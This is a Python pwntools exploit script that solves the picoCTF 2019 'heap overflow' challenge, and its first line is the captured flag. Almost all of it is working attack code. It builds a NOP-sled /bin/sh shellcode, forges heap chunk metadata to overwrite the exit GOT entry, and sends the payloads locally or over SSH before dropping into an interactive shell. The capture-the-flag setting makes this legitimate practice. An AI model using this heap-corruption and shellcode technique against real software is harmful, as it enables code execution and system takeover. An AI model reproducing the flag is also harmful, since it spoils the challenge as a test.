# picoCTF{a_s1mpl3_h3ap_69424381}
from pwn import *
import sys
import subprocess
import r2pipe
argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

# if context.bits == 64:
#   r = process(['ROPgadget', '--binary', BINARY])
#   gadgets = r.recvall().strip().split('\n')[2:-2]
#   gadgets = map(lambda x: x.split(' : '),gadgets)
#   gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
#   r.close()

#   pop_rdi = 0
#   pop_rsi_r15 = 0
#   pop_rdx = 0

#   for addr, name in gadgets:
#     if 'pop rdi ; ret' in name:
#       pop_rdi = addr
#     if 'pop rsi ; pop r15 ; ret' in name:
#       pop_rsi_r15 = addr
#     if 'pop rdx ; ret' in name:
#       pop_rdx = addr

#   def call(f, a1, a2, a3):
#     out = ''
#     if a1 != None:
#       out += p64(pop_rdi)+p64(a1)
#     if a2 != None:
#       out += p64(pop_rsi_r15)+p64(a2)*2
#     if a3 != None:
#       if pop_rdx == 0:
#         print 'RDX GADGET NOT FOUND'
#         exit(-1)
#       else:
#         out += p64(rdx)+p64(a3)
#     return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/heap-overflow_5_39d709fdc06b81d3c23b73bb9cca6bdb')
  REMOTE = True

print sh.recvline()
leak = int(sh.recvline())

print hex(leak)


exit_got = 0x0804d02c

# shellcode = 'a'*8
# shellcode += asm('''
#   jmp sc
#   {}
# sc:
#   nop
#   '''.format('nop\n'*100)+shellcraft.i386.linux.sh())
# shellcode = shellcode.ljust(256)
# print enhex(shellcode)
# print len(shellcode)
# assert len(shellcode) <= 0x2a0-0x8

# fake_chunk = p32(0x49)
# fake_chunk += p32(exit_got-12) 
# fake_chunk += p32(leak+8)
# fake_chunk = fake_chunk.ljust(0x48-0x4)+p32(0x48)

# payload = shellcode + fake_chunk.rjust(0x2a0-0x4-len(shellcode))
# payload += p32(0x48)
# # payload = payload.ljust(0x2a0-0x4)

# # payload += p32(0x2a1)

# sh.sendlineafter('fullname\n', payload)



shellcode = 'a'*8
shellcode += asm('''
  jmp sc
  {}
sc:
  nop
  '''.format('nop\n'*100)+shellcraft.i386.linux.sh())
# print enhex(shellcode)
# shellcode = shellcode.ljust(0x2a0-0x4)
# shellcode += p32(0x49)
shellcode = shellcode.ljust(0x2a0-0x4)
shellcode += p32(0x49).ljust(0x48)
shellcode += p32(0x101)

sh.sendlineafter('fullname\n', shellcode)


fake_chunk = p32(0x101)
fake_chunk += p32(exit_got-12) 
fake_chunk += p32(leak+8)
fake_chunk = fake_chunk.ljust(0x100-0x4)+p32(0x101)

payload = 'a'*(0x100-4)+fake_chunk

# payload += p32(0x2a1)

sh.sendlineafter('lastname\n', payload)

sh.interactive()
  